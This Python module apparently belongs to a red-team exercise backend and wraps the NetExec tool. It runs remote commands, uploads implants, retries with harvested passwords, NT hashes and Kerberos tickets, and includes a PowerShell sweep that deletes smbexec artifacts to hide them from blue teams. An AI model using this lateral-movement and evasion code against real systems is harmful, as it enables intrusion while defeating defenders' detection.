"""NXCWrapper — async subprocess wrapper around the nxc (NetExec) CLI tool.

nxc has no public Python API: importing it directly reconfigures the root
logger, spins up a new asyncio event loop (crashing inside FastAPI's loop),
and uses module-level Rich console singletons that can't be captured per-
request.  All invocations go through asyncio.create_subprocess_exec.
"""

import asyncio
import base64
import contextlib
import hashlib
import logging
import os
import re
import shutil
import subprocess
import time
from dataclasses import dataclass
from pathlib import Path
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from sqlalchemy.orm import Session  # lazy-load

    from fastapi_backend.database.models import Credentials  # lazy-load

from fastapi_backend.netexec.script_wrapper import dial_host
from fastapi_backend.utils.nxc_failure_tracker import nxc_failure_tracker

# Matches the per-line prefix nxc prepends to every output line, e.g.:
#   SMB   10.0.1.10   445   HOSTNAME   [+] user:pass (Pwn3d!)
#   SSH   10.0.1.11   22    HOSTNAME   some output here
_PREFIX_RE = re.compile(r"^\w+\s+[\d.:]+\s+\d+\s+\S+\s+")

# Exec-method failure pattern: nxc reports auth success ([+]) but then fails
# to actually run the command. These appear as [-] lines naming the exec method.
# Examples: "[-] wmiexec: Could not retrieve output file"
#           "[-] smbexec: Execution failed"
_EXEC_FAILURE_RE = re.compile(
    # `Unknown DCE RPC fault status code` is an exec-transport fault: the command
    # produced no stdout, yet NXC still prints a [+] auth line, so without this the
    # result parsed as success-with-empty-output and callers silently believed a
    # command had run and returned nothing (~780 occurrences in one 2026-07-30 suite
    # run, all surfacing as bogus put_file "hash mismatch" verdicts).
    # As with the other patterns, a later `[+] Executed` line still wins — see
    # _parse_output: these only fail the result when the command never executed.
    r"\[-\].*(?:wmiexec|smbexec|atexec|mmcexec|dcomexec|could not retrieve"
    r"|dce rpc fault)",
    re.IGNORECASE,
)

# smbexec drops its readback file as `\\HOST\C$\<gen_random_string(6)>` (C:\ root,
# exactly 6 ascii letters, no extension) and its launcher as `<6 letters>.bat` in
# %TEMP% (C:\Windows\Temp).  Both are deleted by smbexec on the happy path but leak
# on read/delete races — and their content is the IOC-check JSON / SA dump, which
# blue teams must not see (docs/PLAN_kill_nxc_readback.md).  This janitor removes
# any such leftover.  The signature is tight — exactly `^[A-Za-z]{6}$` (or `.bat`),
# <1 MB — so it never touches legit files (pagefile.sys, DumpStack.log.tmp,
# 10-char .txt, dirs, `bootmgr`/`BOOTNXT` = 7 chars, anything with an extension).
# Delivered with retrieve_output=False so the sweep itself drops nothing.
#
# recent_only=True adds a `mtime > now-5min` bound — conservative, for the
# per-exec sweep that targets THIS call's fresh artifact.  recent_only=False
# drops that bound to clear HISTORICAL leftovers (the SA-cycle defensive sweep);
# the exact 6-letter / no-extension / C:\-root pattern is safe on its own since
# nothing legit in C:\ root matches it.


def _smbexec_sweep_ps(recent_only: bool = True) -> str:
    win = "$_.LastWriteTime -gt (Get-Date).AddMinutes(-5) -and " if recent_only else ""
    return (
        f"Get-ChildItem 'C:\\' -File -Force -EA SilentlyContinue|"
        f"?{{$_.Name -match '^[A-Za-z]{{6}}$' -and $_.Length -lt 1048576 -and {win}$true}}|"
        f"Remove-Item -Force -EA SilentlyContinue;"
        f"Get-ChildItem 'C:\\Windows\\Temp' -File -Force -EA SilentlyContinue|"
        f"?{{$_.Name -match '^[A-Za-z]{{6}}\\.bat$' -and {win}$true}}|"
        f"Remove-Item -Force -EA SilentlyContinue"
    )


# Back-compat module constant (the default per-exec, recent-only sweep body).
_SMBEXEC_SWEEP_PS = _smbexec_sweep_ps(recent_only=True)

# OpenSSH advisory banners (e.g. the post-quantum kex warning printed by newer
# clients) land on scp/ssh stderr on every connection.  They are benign, but
# when an error string is truncated they consume the budget and bury the real
# failure (e.g. "Read-only file system").  Strip them before composing errors.
_SSH_BANNER_RE = re.compile(r"^\s*\*\*\s")

# A 64-hex SHA256 as emitted by PowerShell Get-FileHash (.Hash), used to verify
# an SMB put_file landed intact (docs/PLAN_implant_deploy_live_fire_fixes.md C).
_SHA256_RE = re.compile(r"\b[0-9a-fA-F]{64}\b")

# TRANSIENT SMB put_file transport errors worth retrying — timeouts / resets that
# recover on a fresh attempt (reproduced live on a flaky box under concurrent
# writes). Deterministic errors (bad path -> STATUS_OBJECT_NAME_INVALID, perms
# -> access denied) are NOT here: retrying them just wastes 5x the wall-clock on
# a failure that will never succeed. Hash mismatches are retried separately (a
# partial write can recover) via the reliable-path logic, not this pattern.
_TRANSIENT_PUT_RE = re.compile(
    r"NETBIOS connection.*timed out"
    r"|reading from remote"
    r"|connection (?:reset|aborted|closed)"
    r"|broken pipe"
    r"|timed out"
    r"|\(104\)"
    # Sliver pivot portfwd proxy hiccup — paramiko can't read the SSH banner
    # because Sliver's TCP forward dropped mid-relay. Log signature:
    #   `nxc failed for ssh 127.0.0.1 (exit 0): SSH ... Unknown SSH Version, skipping...`
    # accompanied by `portfwd proxy error for <box_ip>:22:` (pivot_helpers.py:187).
    # Transient: another attempt usually catches Sliver in a healthy state.
    # See docs/PLAN_cred_loop_cooldown_defer.md (surfaced in 2026-08-25 clean2 soak).
    r"|Unknown SSH Version"
    # Same pivot-portfwd banner hiccup, paramiko's other phrasing — the SSH
    # handshake can't read the server banner because Sliver's TCP forward
    # dropped/raced mid-relay. Seen on the HTTP-pull curl exec under soak load
    # (2026-08-28): transient, a re-attempt catches the tunnel healthy.
    r"|reading SSH protocol banner",
    re.IGNORECASE,
)

# CROSS-CRED FALLBACK triggers — auth-rejection sentinels the wrapper watches
# for so a failing primary cred (e.g. a stale local `.\red_scoring`) causes an
# immediate retry with the box's next-best cred (e.g. `MIRA-01\red_scoring`)
# instead of surfacing an auth failure. Superset of check_runner._AUTH_REJECT_RE
# — includes STATUS_NO_LOGON_SERVERS (secure-channel dead), STATUS_NO_SUCH_USER
# (SAM absent on a DC), and KRB_AP_ERR_SKEW (clock skew) so a domain-side
# environmental issue also flips over to the alternative cred. Kept separate
# from _AUTH_REJECT_RE because that regex feeds classify_cred_probe's
# "compromised vs remediated" scoring decision, and misclassifying a DC-down
# blip as "blue hardened the account" would award points wrongly.
_AUTH_FALLBACK_RE = re.compile(
    r"STATUS_LOGON_FAILURE|STATUS_ACCESS_DENIED|STATUS_PASSWORD_EXPIRED|"
    r"STATUS_ACCOUNT_DISABLED|STATUS_ACCOUNT_LOCKED_OUT|STATUS_WRONG_PASSWORD|"
    r"STATUS_PASSWORD_MUST_CHANGE|STATUS_NO_LOGON_SERVERS|STATUS_NO_SUCH_USER|"
    r"KRB_AP_ERR_SKEW|Authentication\s+failed|authentication\s+failure|"
    r"Logon\s+failure|Permission\s+denied|Access\s+denied|AccessDenied",
    re.IGNORECASE,
)

# TRANSIENT exec/auth failures (NETBIOS-timeout class) worth one bounded, back-off'd
# retry in _run — a momentarily-congested box's SMB, not a deterministic failure.
# Narrower than _TRANSIENT_PUT_RE (no generic "timed out", which would also catch
# the exec-command timeout) — NETBIOS connect + connection reset/aborted only.
_TRANSIENT_EXEC_RE = re.compile(
    r"NETBIOS connection.*timed out"
    r"|STATUS_IO_TIMEOUT"
    r"|connection (?:reset|aborted|closed)"
    r"|\(104\)"
    # Sliver pivot portfwd proxy hiccup on SSH exec (see _TRANSIENT_PUT_RE).
    r"|Unknown SSH Version"
    r"|reading SSH protocol banner",
    re.IGNORECASE,
)


def is_transient_failure(result: "NXCResult") -> bool:
    """True if `result` is a NETBIOS-class transient failure."""
    if result.success:
        return False
    return bool(_TRANSIENT_EXEC_RE.search(f"{result.raw or ''} {result.error or ''}"))


def _sha256_file(path: str | Path) -> str:
    """Return the lowercase hex SHA256 of a local file (chunked, blocking)."""
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            h.update(chunk)
    return h.hexdigest()


def _smb_full_path(remote_path: str) -> str:
    r"""Map an SMB C$-share-relative path to an absolute Windows path.

    put_file receives share-relative paths (``\Windows\Temp\x.exe``); Get-FileHash
    needs the absolute ``C:\Windows\Temp\x.exe``. Idempotent if a drive is already
    present.
    """
    rp = remote_path
    if len(rp) >= 2 and rp[1] == ":":  # already absolute (C:\...)
        return rp
    if not rp.startswith("\\"):
        rp = "\\" + rp
    return "C:" + rp


def _strip_ssh_banners(stderr: str) -> str:
    """Drop OpenSSH advisory banner lines (lines beginning with ``** ``)."""
    return "\n".join(
        ln for ln in stderr.splitlines() if not _SSH_BANNER_RE.match(ln)
    ).strip()


class _NXCSubprocessTimeoutError(Exception):
    """Raised by _spawn_nxc_sync when the child exceeds the timeout budget."""


def _spawn_nxc_sync(
    args: list[str], env: dict[str, str], timeout_s: float,
) -> tuple[bytes, int | None]:
    """Spawn nxc synchronously in a worker thread. Returns (stdout_bytes, returncode).

    docs/PLAN_soak_backend_perf.md §3.3: the async wrapper (`_spawn_once`) runs
    this via ``asyncio.to_thread`` so the post-fork ``logging._afterFork``
    weakref sweep happens on the worker thread, NOT on the asyncio event loop
    (proven 2026-08-30: 944-2060ms loop stalls from create_subprocess_exec).
    """
    proc = subprocess.Popen(
        ["nxc", *args],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        env=env,
        close_fds=True,
    )
    try:
        stdout_bytes, _ = proc.communicate(timeout=timeout_s)
    except subprocess.TimeoutExpired as exc:
        with contextlib.suppress(Exception):
            proc.kill()
        with contextlib.suppress(Exception):
            proc.communicate(timeout=5)
        raise _NXCSubprocessTimeoutError(str(exc)) from exc
    return stdout_bytes, proc.returncode


@dataclass
class NXCResult:
    """Result of a single nxc invocation."""

    success: bool       # True if [+] present AND no exec-method failure lines
    output: str         # command output with nxc prefix formatting stripped
    host: str
    protocol: str
    error: str | None   # set when success=False; last stripped line or exception msg
    raw: str            # full nxc stdout for debugging
    returncode: int | None = None  # nxc process exit code; None on timeout/spawn exception
    delivery_method: str | None = None  # which tier delivered a put_file: smb|winrm|ssh (None=smb/default)


class NXCWrapper:
    """Async wrapper for the nxc CLI tool.

    All public methods are coroutines and delegate to _run(), which launches
    nxc as an asyncio subprocess and captures its stdout.

    Concurrency is governed by a single process-wide threading.BoundedSemaphore
    in nxc_semaphore.py — shared across all NXCWrapper instances and all event
    loops (worker threads + main FastAPI loop).
    """

    def __init__(
        self,
        nxc_path: str = "./nxc_workspace",
        default_timeout: int = 30,
    ) -> None:
        self.nxc_path = nxc_path
        self.default_timeout = default_timeout
        self.logger = logging.getLogger(__name__)

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    async def execute(
        self,
        host: str,
        protocol: str,
        username: str,
        password: str,
        command: str,
        powershell: bool = False,
        port: int | None = None,
        exec_method: str | None = None,
        retrieve_output: bool = True,
        sweep_after: bool = False,
        *,
        box_ip: str | None = None,
    ) -> NXCResult:
        """Run a shell command on a remote host.

        Args:
            host: Target IP or hostname.
            protocol: NXC protocol — "smb" / "ssh" / "winrm".
            username: NXC auth username.
            password: NXC auth password.
            command: Shell or PowerShell command string to run.
            powershell: If True, use -X (PowerShell exec); otherwise -x (cmd/shell).
            port: Override the default protocol port (e.g. for portfwd routing).
            exec_method: SMB exec method override (e.g. "smbexec"). Non-SMB protocols
                ignore this. If the specified method fails, retries with NXC default.
            retrieve_output: When False on SMB, pass ``--no-output`` so smbexec runs
                the command WITHOUT the ``^> \\HOST\\C$\\<rand>`` stdout redirect —
                no readback file dropped on the C$ share root (docs/PLAN_kill_nxc_
                readback.md). The caller must source output elsewhere (the result
                callback). Ignored on non-SMB (SSH returns stdout over the channel).
            sweep_after: When True on SMB, fire ``cleanup_smbexec_artifacts`` after
                the exec to scrub any smbexec output/batch leftover this call (or a
                prior one) left on ``C:\\`` — for callback-less paths that must use
                readback and therefore drop a file. No-op on non-SMB.
            box_ip: True target box IP when ``host`` is a pivot dial target
                (e.g. ``127.0.0.1``). Threaded through ``_run`` so the per-box
                circuit-breaker keys on the real box, not the shared portfwd host.
                See ``docs/PLAN_cred_loop_cooldown_defer.md``.
        """  # noqa: D301
        args = self._build_base_args(protocol, host, username, password, port=port)
        if exec_method and protocol == "smb":
            args += ["--exec-method", exec_method]
        if not retrieve_output and protocol == "smb":
            args.append("--no-output")
        args += ["-X" if powershell else "-x", command]
        result = await self._run(args, host, protocol, box_ip=box_ip)
        if (
            exec_method
            and protocol == "smb"
            and not result.success
            and _EXEC_FAILURE_RE.search(result.raw)
        ):
            self.logger.warning(
                "exec-method %s failed for %s, retrying with NXC default", exec_method, host
            )
            fallback_args = self._build_base_args(protocol, host, username, password, port=port)
            if not retrieve_output and protocol == "smb":
                fallback_args.append("--no-output")
            fallback_args += ["-X" if powershell else "-x", command]
            result = await self._run(fallback_args, host, protocol, box_ip=box_ip)
            if result.success:
                self.logger.info("Fallback exec method succeeded for %s", host)

        # Cross-cred fallback (plain-string variant): if the primary
        # username/password combo auth-fails, resolve the box's next-best
        # cred and retry once. Mirrors execute_cred's fallback and covers
        # the deploy path (routes/ioc_deploy._deploy_one uses this plain
        # execute() rather than execute_cred).
        if (
            not result.success
            and _AUTH_FALLBACK_RE.search(result.raw or "")
        ):
            alt = self._resolve_fallback_by_username(
                box_ip or host, protocol, username,
            )
            if alt is not None:
                alt_pw = alt.password or ""
                self.logger.warning(
                    "cross-cred fallback on %s: primary %s auth-failed (%s); "
                    "retrying with next-best cred %s",
                    box_ip or host, username,
                    (result.error or "").strip()[:120], alt.username,
                )
                alt_args = self._build_base_args(
                    protocol, host, alt.username, alt_pw, port=port,
                )
                if exec_method and protocol == "smb":
                    alt_args += ["--exec-method", exec_method]
                if not retrieve_output and protocol == "smb":
                    alt_args.append("--no-output")
                alt_args += ["-X" if powershell else "-x", command]
                result = await self._run(alt_args, host, protocol, box_ip=box_ip)
                if result.success:
                    self.logger.info(
                        "cross-cred fallback succeeded on %s with %s",
                        box_ip or host, alt.username,
                    )

        # Track NXC result for box unreachable detection
        await nxc_failure_tracker.record_result(box_ip or host, result.success)
        if sweep_after and protocol == "smb":
            await self.cleanup_smbexec_artifacts(host, username, password, port=port)
        return result

    async def put_file(
        self,
        host: str,
        protocol: str,
        username: str,
        password: str,
        local_path: str | Path,
        remote_path: str,
        port: int | None = None,
    ) -> NXCResult:
        """Copy a local file to a remote host."""
        if protocol == "smb":
            # NXC --put-file writes RELATIVE to the C$ share, so the dest must be
            # share-relative. A leading drive letter (C:\...) is taken as part of
            # the object name and the ':' makes SMB reject it with
            # STATUS_OBJECT_NAME_INVALID (0xc0000033). Strip it here centrally so no
            # caller can leak an absolute path (bulk_put_file strips it too;
            # module_runner already builds share-relative — this backstops the rest).
            remote_path = re.sub(r"^[A-Za-z]:[/\\]", r"\\", remote_path)

        async def _push(u: str, p: str) -> NXCResult:
            if protocol == "smb":
                # Serialize + retry + hash-verify large SMB writes.
                return await self._put_file_smb_reliable(
                    host=host, local_path=local_path, remote_path=remote_path,
                    port=port, username=u, password=p,
                )
            if protocol == "ssh":
                # Serialize + retry + hash-verify + extended-timeout SSH writes.
                return await self._put_file_ssh_reliable(
                    host=host, local_path=local_path, remote_path=remote_path,
                    port=port, username=u, password=p,
                )
            # WinRM (or any future protocol) — legacy single-shot path.
            _a = self._build_base_args(protocol, host, u, p, port=port)
            _a += ["--put-file", str(local_path), remote_path]
            _r = await self._run(_a, host, protocol)
            if _r.success and "Error writing file" in _r.raw:
                error_lines = [
                    line for line in _r.raw.splitlines()
                    if "Error writing file" in line
                ]
                stripped = [_PREFIX_RE.sub("", line) for line in error_lines]
                _r = NXCResult(
                    success=False,
                    output=_r.output,
                    host=_r.host,
                    protocol=_r.protocol,
                    error=stripped[0] if stripped else "Error writing file",
                    raw=_r.raw,
                )
            return _r

        result = await _push(username, password)

        # Cross-cred fallback (plain-string variant): auth-fail → next-best
        # cred + retry once. Mirrors execute()'s fallback for the deploy
        # path's put_file calls (routes/ioc_deploy uses this plain form).
        if (
            not result.success
            and _AUTH_FALLBACK_RE.search(getattr(result, "raw", "") or "")
        ):
            alt = self._resolve_fallback_by_username(host, protocol, username)
            if alt is not None:
                alt_pw = alt.password or ""
                self.logger.warning(
                    "cross-cred put_file fallback on %s: primary %s auth-failed "
                    "(%s); retrying with next-best cred %s",
                    host, username,
                    (result.error or "").strip()[:120], alt.username,
                )
                result = await _push(alt.username, alt_pw)
                if result.success:
                    self.logger.info(
                        "cross-cred put_file fallback succeeded on %s with %s",
                        host, alt.username,
                    )
        return result

    async def _scp_put_file(
        self,
        host: str,
        username: str,
        password: str,
        local_path: str | Path,
        remote_path: str,
        port: int | None = None,
    ) -> NXCResult:
        """Fallback SSH file upload using scp -O (legacy SCP protocol, no SFTP subsystem needed).

        Used when the target SSH server doesn't support SFTP (e.g. pfSense/FreeBSD).
        Requires sshpass to be installed for password authentication.
        """
        sshpass = shutil.which("sshpass")
        if not sshpass:
            return NXCResult(
                success=False,
                output="",
                host=host,
                protocol="ssh",
                error="scp fallback unavailable: sshpass not found",
                raw="",
            )

        ssh_port = port or 22
        cmd = [
            sshpass, "-p", password,
            "scp", "-O",
            "-o", "StrictHostKeyChecking=no",
            "-o", "PasswordAuthentication=yes",
            "-P", str(ssh_port),
            str(local_path),
            f"{username}@{dial_host(host)}:{remote_path}",
        ]
        from fastapi_backend.core.config import config  # cycle-break

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            # Same class of large-upload timeout as _put_file_ssh_reliable — scp -O
            # falls back from SFTP for the same targets (pfSense/embedded), so the
            # extended timeout applies here too. See docs/PLAN_ssh_putfile_reliable.md.
            stdout_b, stderr_b = await asyncio.wait_for(
                proc.communicate(), timeout=config.NXC_PUTFILE_SSH_TIMEOUT,
            )
            stdout_s = (stdout_b or b"").decode(errors="replace")
            stderr_s = (stderr_b or b"").decode(errors="replace")
            raw = f"{stdout_s}\n{stderr_s}".strip()
            if proc.returncode == 0:
                return NXCResult(
                    success=True,
                    output=f"scp uploaded {local_path} → {host}:{remote_path}",
                    host=host,
                    protocol="ssh",
                    error=None,
                    raw=raw,
                )
            clean_err = _strip_ssh_banners(stderr_s) or stderr_s.strip()
            return NXCResult(
                success=False,
                output="",
                host=host,
                protocol="ssh",
                error=f"scp exited {proc.returncode}: {clean_err[:300]}",
                raw=raw,
            )
        except TimeoutError:
            return NXCResult(
                success=False,
                output="",
                host=host,
                protocol="ssh",
                error=f"scp fallback timed out after {config.NXC_PUTFILE_SSH_TIMEOUT}s",
                raw="",
            )
        except Exception as exc:
            return NXCResult(
                success=False,
                output="",
                host=host,
                protocol="ssh",
                error=f"scp fallback error: {exc}",
                raw="",
            )

    async def check_creds(
        self,
        host: str,
        protocol: str,
        username: str,
        password: str,
        port: int | None = None,
    ) -> NXCResult:
        """Test credentials against a host without running any command."""
        args = self._build_base_args(protocol, host, username, password, port=port)
        result = await self._run(args, host, protocol)

        # Track NXC result for box unreachable detection
        await nxc_failure_tracker.record_result(host, result.success)
        return result

    # ------------------------------------------------------------------
    # Internals
    # ------------------------------------------------------------------

    def _build_base_args(
        self,
        protocol: str,
        host: str,
        username: str,
        password: str,
        port: int | None = None,
    ) -> list[str]:
        # DIAL the box's wan_ip when it has one (firewall/pfSense reached via WAN);
        # `host` stays box_ip for metrics/semaphore/parse (docs/PLAN_firewall_wan_dial.md).
        args = [protocol, dial_host(host), "-u", username, "-p", password]
        if port is not None:
            args += ["--port", str(port)]
        if protocol == "smb":
            from fastapi_backend.core.config import config  # cycle-break
            args += ["--get-output-tries", str(config.NXC_GET_OUTPUT_TRIES)]
        return args

    # ------------------------------------------------------------------
    # Credential-aware variants (Phase B — cred_harvester integration)
    # ------------------------------------------------------------------

    def _materialize_ccache(self, cred: "Credentials") -> Path:
        """Write a ccache row's base64 blob to a chmod-600 file and return path.

        Reuses the same file across calls when the ticket has not been
        re-forged (compares `ticket_expires_at` as the version stamp). Files
        live under `<nxc_path>/ccache/<cred_id>.ccache`.
        """
        if not hasattr(self, "_ccache_cache"):
            self._ccache_cache: dict[int, tuple[Path, object]] = {}
        cached = self._ccache_cache.get(cred.cred_id)
        if cached and cached[1] == cred.ticket_expires_at:
            return cached[0]
        ccache_dir = Path(self.nxc_path) / "ccache"
        ccache_dir.mkdir(parents=True, exist_ok=True)
        path = ccache_dir / f"{cred.cred_id}.ccache"
        if not cred.ccache_blob:
            raise ValueError(f"cred {cred.cred_id} has no ccache_blob")
        path.write_bytes(base64.b64decode(cred.ccache_blob))
        path.chmod(0o600)
        self._ccache_cache[cred.cred_id] = (path, cred.ticket_expires_at)
        return path

    def _resolve_fallback_by_username(
        self,
        box_ip: str | None,
        protocol: str,
        username: str,
    ) -> "Credentials | None":
        """String-cred variant of _resolve_fallback_cred.

        The plain `execute()` / `put_file()` paths only carry username/password
        strings, not a Credentials row. This looks up the cred_id by
        (box_ip, protocol, username) so the wrapper knows what to exclude
        from the next-best pick, and infers is_infrastructure from that row
        so the scoring/operator scope is preserved. Returns None when the
        primary username can't be pinned to a DB row (in which case an
        exclude-nothing lookup would just return the same cred and loop).
        """
        if box_ip is None or not username:
            return None
        try:  # cycle-break
            from sqlalchemy import select as _select
            from sqlalchemy.orm import Session as _Session

            from fastapi_backend.database.db_writer import engine as _engine
            from fastapi_backend.database.models import Credentials as _Cred
            from fastapi_backend.utils.nxc_routing import (
                _get_best_cred as _pick,
            )
        except Exception:
            return None
        try:
            with _Session(_engine) as _s:
                row = _s.execute(
                    _select(_Cred).where(
                        _Cred.box_ip == box_ip,
                        _Cred.protocol == protocol,
                        _Cred.username == username,
                    ).limit(1)
                ).scalar_one_or_none()
                if row is None:
                    return None
                return _pick(
                    box_ip, _s, protocol=protocol,
                    scoring_only=bool(row.is_infrastructure),
                    include_invalid=True,
                    exclude_cred_ids={row.cred_id},
                )
        except Exception as exc:
            self.logger.debug(
                "cred fallback (by username) lookup failed for %s/%s: %s",
                box_ip, username, exc,
            )
            return None

    def _resolve_fallback_cred(
        self,
        box_ip: str | None,
        protocol: str,
        current_cred: "Credentials",
    ) -> "Credentials | None":
        r"""Return the next-best cred for `box_ip` on `protocol`.

        Excludes the cred that just auth-failed. Returns None when no
        alternative exists or the DB lookup fails. Read-only — never writes.
        Called from execute_cred / put_file_cred on an _AUTH_FALLBACK_RE match
        so a stale local cred (say `.\red_scoring` after a blue-team password
        rotation) transparently falls back to the domain row
        (`MIRA-01\red_scoring`) inside the same deploy attempt, instead of
        surfacing the auth failure and waiting on the ~5-minute cred-
        revalidation loop to catch up.
        """
        if box_ip is None:
            return None
        cid = getattr(current_cred, "cred_id", None)
        if cid is None:
            return None
        try:  # cycle-break: heavy DB imports deferred to first fallback trigger
            from sqlalchemy.orm import Session as _Session

            from fastapi_backend.database.db_writer import engine as _engine
            from fastapi_backend.utils.nxc_routing import (
                _get_best_cred as _pick,
            )
        except Exception:  # pragma: no cover — defensive
            return None
        try:
            with _Session(_engine) as _s:
                return _pick(
                    box_ip, _s, protocol=protocol,
                    scoring_only=bool(getattr(current_cred, "is_infrastructure", False)),
                    include_invalid=True,
                    exclude_cred_ids={cid},
                )
        except Exception as exc:  # never let a lookup crash a live deploy
            self.logger.debug(
                "cred fallback lookup failed for %s: %s", box_ip, exc,
            )
            return None

    def _build_cred_args(
        self,
        protocol: str,
        host: str,
        cred: "Credentials",
        port: int | None = None,
        kdc_host: str | None = None,
    ) -> tuple[list[str], dict[str, str]]:
        """Build (nxc_args, env_overrides) for a Credentials row.

        Branches on `cred.cred_type`:
          - password: `-u <u> -p <pw>` (legacy path)
          - nthash:   `-u <u> -H <nthash>` + `-d <domain>` or `--local-auth`
          - ccache:   `-k --use-kcache` with `KRB5CCNAME` env

        Returned env_overrides is empty for password/nthash; ccache rows
        carry `{"KRB5CCNAME": "<path>"}`.
        """
        args: list[str] = [protocol, dial_host(host)]  # dial wan_ip if firewall
        env: dict[str, str] = {}
        ct = cred.cred_type or "password"
        if ct == "password":
            args += ["-u", cred.username, "-p", cred.password or ""]
            if cred.domain:
                args += ["-d", cred.domain]
        elif ct == "nthash":
            if not cred.nthash:
                raise ValueError(f"cred {cred.cred_id} cred_type=nthash but nthash empty")
            args += ["-u", cred.username, "-H", cred.nthash]
            if cred.domain:
                args += ["-d", cred.domain]
            else:
                args += ["--local-auth"]
        elif ct == "ccache":
            ccache_path = self._materialize_ccache(cred)
            env["KRB5CCNAME"] = str(ccache_path)
            args += ["-k", "--use-kcache"]
            if cred.domain:
                args += ["-d", cred.domain]
            # Without --kdcHost, NXC resolves the realm name via DNS and the
            # KDC port (88) — almost always broken in offline labs. Passing
            # the DC's IP short-circuits resolution. Caller supplies it
            # because `host` may be a member box, not the DC.
            if kdc_host:
                args += ["--kdcHost", kdc_host]
        else:
            raise ValueError(f"unknown cred_type: {ct!r}")
        if port is not None:
            args += ["--port", str(port)]
        if protocol == "smb":
            from fastapi_backend.core.config import config  # cycle-break
            args += ["--get-output-tries", str(config.NXC_GET_OUTPUT_TRIES)]
        return args, env

    # ------------------------------------------------------------------
    # Kerberos ticket validation (docs/PLAN_ticket_multibox_validation.md)
    #
    # Windows validation rides the existing nxc smb `-k --use-kcache` path
    # (validate_ticket_smb). Linux CANNOT: nxc's ssh protocol module accepts
    # `-k/--use-kcache` but never does GSSAPI (password/pubkey only), so Linux
    # uses raw `ssh` GSSAPI (ssh_kerberos_check) with an `impacket-getST`
    # service-ticket fallback (getst_service_ticket).
    # ------------------------------------------------------------------

    def _synth_krb5_conf(self, realm: str, kdc_ip: str) -> Path:
        """Write a minimal one-realm krb5.conf and return its path (cached).

        Offline-lab safe: `dns_lookup_kdc/realm = false`, `rdns = false`, and a
        single static `kdc = <ip>`. Lives under `<nxc_path>/krb5/` so it never
        touches the host's `/etc/krb5.conf`; referenced per-call via `KRB5_CONFIG`
        so concurrent validations against different realms don't collide.
        """
        realm = realm.upper()
        if not hasattr(self, "_krb5_conf_cache"):
            self._krb5_conf_cache: dict[tuple[str, str], Path] = {}
        key = (realm, kdc_ip)
        cached = self._krb5_conf_cache.get(key)
        if cached and cached.exists():
            return cached
        krb5_dir = Path(self.nxc_path) / "krb5"
        krb5_dir.mkdir(parents=True, exist_ok=True)
        path = krb5_dir / f"{realm}_{kdc_ip}.conf"
        low = realm.lower()
        path.write_text(
            "[libdefaults]\n"
            f"    default_realm = {realm}\n"
            "    dns_lookup_kdc = false\n"
            "    dns_lookup_realm = false\n"
            "    rdns = false\n"
            "    udp_preference_limit = 1\n"
            "[realms]\n"
            f"    {realm} = {{\n"
            f"        kdc = {kdc_ip}\n"
            f"        admin_server = {kdc_ip}\n"
            "    }\n"
            "[domain_realm]\n"
            f"    .{low} = {realm}\n"
            f"    {low} = {realm}\n"
        )
        path.chmod(0o600)
        self._krb5_conf_cache[key] = path
        return path

    async def validate_ticket_smb(
        self, box_ip: str, cred: "Credentials", *, kdc_host: str,
    ) -> tuple[bool, str]:
        """Validate a ccache against a Windows box via `nxc smb -k --shares`.

        Generalizes the background DC-only probe (cred_harvester
        `_probe_team_ticket`) to any team box. Returns (ok, detail).
        """
        args, env = self._build_cred_args("smb", box_ip, cred, kdc_host=kdc_host)
        args += ["--shares"]
        result = await self._run(args, box_ip, "smb", env_extra=env or None)
        detail = "shares listed" if result.success else (result.error or "auth failed")
        return bool(result.success), detail[:300]

    async def ssh_kerberos_check(
        self, host: str, ccache_path: "Path | str", *,
        login_user: str, realm: str, kdc_ip: str, spn_host: str,
        timeout: int | None = None,
    ) -> tuple[bool, str]:
        """Attempt an SSH GSSAPI login with a ccache and run `id`.

        Connects to `host` (IP) but presents `login_user@spn_host` so the GSSAPI
        service principal is `host/<spn_host>` (the box's AD computer SPN) while
        no DNS/`/etc/hosts` entry is needed (`-o HostName=<ip>`). Returns
        (ok, detail); ok iff ssh authenticated AND `id` returned `uid=`.
        Distinguishes an unreachable box from an auth failure in `detail`.
        """
        from fastapi_backend.core.config import config  # cycle-break

        krb5 = self._synth_krb5_conf(realm, kdc_ip)
        env = {
            **os.environ,
            "KRB5CCNAME": str(ccache_path),
            "KRB5_CONFIG": str(krb5),
        }
        ct = int(timeout or config.SSH_KERBEROS_TIMEOUT)
        args = [
            "ssh",
            "-o", "GSSAPIAuthentication=yes",
            "-o", "GSSAPIKeyExchange=no",
            "-o", "PreferredAuthentications=gssapi-with-mic",
            "-o", "PubkeyAuthentication=no",
            "-o", "PasswordAuthentication=no",
            "-o", "KbdInteractiveAuthentication=no",
            "-o", "BatchMode=yes",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", f"HostName={host}",
            "-o", f"ConnectTimeout={ct}",
            f"{login_user}@{spn_host}",
            "id",
        ]
        try:
            proc = await asyncio.create_subprocess_exec(  # nxc-wrapper-bypass: raw ssh GSSAPI, not an nxc op
                *args,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=env,
            )
            out_b, err_b = await asyncio.wait_for(proc.communicate(), timeout=ct + 10)
        except TimeoutError:
            with contextlib.suppress(ProcessLookupError):
                proc.kill()
            return False, "unreachable: ssh timeout"
        except FileNotFoundError:
            return False, "ssh binary not found"
        out = out_b.decode(errors="replace")
        err = err_b.decode(errors="replace")
        if proc.returncode == 0 and "uid=" in out:
            return True, f"ssh-gssapi: {out.strip().splitlines()[0][:200]}"
        blob = (err or out).lower()
        if any(s in blob for s in (
            "connection refused", "connection timed out", "no route to host",
            "operation timed out", "connection closed",
        )):
            return False, f"unreachable: {err.strip()[:200]}"
        return False, f"auth-failed: {err.strip()[:200] or out.strip()[:200]}"

    async def getst_service_ticket(
        self, *, ccache_path: "Path | str", realm: str, principal: str,
        kdc_ip: str, spn: str, timeout: int | None = None,
    ) -> tuple[bool, str]:
        """Request a service ticket from a golden TGT via `impacket-getST`.

        `impacket-getST -k -no-pass -dc-ip <kdc> -spn <spn> <realm>/<principal>`
